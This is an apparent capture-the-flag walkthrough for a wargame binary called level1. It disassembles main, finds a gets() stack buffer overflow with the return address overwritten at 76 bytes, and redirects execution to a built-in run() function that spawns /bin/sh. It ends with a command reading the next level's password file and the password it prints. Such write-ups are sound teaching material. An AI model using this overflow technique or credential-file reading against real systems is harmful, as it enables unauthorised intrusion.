# Level1 Walkthrough

## Initial Analysis

1. Connect to level1 and analyze the binary
2. Using GDB to understand the program flow:
```bash
gdb ./level1
gef➤ b *main
gef➤ x/10i $eip
```

### Main Function Analysis
```asm
0x8048480 <main>:    push   ebp
0x8048481 <main+1>:  mov    ebp,esp
0x8048483 <main+3>:  and    esp,0xfffffff0
0x8048486 <main+6>:  sub    esp,0x50
0x8048489 <main+9>:  lea    eax,[esp+0x10]
0x804848d <main+13>: mov    DWORD PTR [esp],eax
0x8048490 <main+16>: call   0x8048340 <gets@plt>
```

Key observations:
- Stack space allocated: 0x50 (80) bytes
- Buffer starts at: esp+0x10 (16 bytes offset)
- Vulnerable function: gets() (no bounds checking)
- Available buffer space: 0x50 - 0x10 = 0x40 (64 bytes)

## Exploitation Process

### 1. Finding the Buffer Overflow Offset
- Created and ran find_offset.py script
- Result: EIP overwrite occurs at 76 bytes
- This matches our analysis: slightly larger than the available buffer space (64 bytes)

### 2. Finding the Target Function
- Binary analysis revealed a function named 'run' at address 0x8048444
- Decompilation of run function:

```asm
run proc
    push    ebp
    mov     ebp, esp
    sub     esp, 18h
    mov     eax, ds:stdout@@GLIBC_2_0
    mov     edx, eax
    mov     eax, offset aGoodWaitWhat    ; "Good... Wait what?\n"
    mov     [esp+0Ch], edx
    mov     dword ptr [esp+8], 13h
    mov     dword ptr [esp+4], 1
    mov     [esp], eax
    call    _fwrite
    mov     dword ptr [esp], offset aBinSh ; "/bin/sh"
    call    _system
    leave
    retn
run endp
```

Key findings:
- Function prints "Good... Wait what?\n"
- Calls system("/bin/sh") - perfect for exploitation

### 3. Exploitation
Created exploit with:
- 76 bytes padding
- Address of run function (0x8048444)

## Success
Executing the exploit:
```bash
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Summary
1. Buffer overflow vulnerability in gets()
2. EIP overwrite at 76 bytes
3. Redirected execution to run() function
4. Gained shell access and retrieved level2 password


